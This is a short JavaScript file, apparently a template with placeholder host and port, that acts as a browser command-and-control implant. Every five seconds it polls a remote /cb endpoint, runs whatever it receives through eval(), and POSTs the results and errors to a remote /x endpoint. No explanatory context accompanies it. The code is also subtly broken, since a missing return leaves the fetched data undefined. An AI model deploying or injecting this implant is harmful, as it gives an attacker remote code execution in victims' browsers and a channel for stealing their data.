function lg(...data) {
    fetch("http://{}:{}/x", { method: "POST", body: JSON.stringify(data) })
}

setInterval(function () {
    let console = {}
    console.log = lg;
    fetch('http://{}:{}/cb').then(function (res) { res.text() }).then(function (data) {
        if (data.length) {
            try {
                res = eval(data);
                if (res) {
                    console.log(res);
                }
            } catch (e) {
                console.log(e);
            }
        }
    }).catch(function (err) {
        console.log(err);
    });
}, 5000)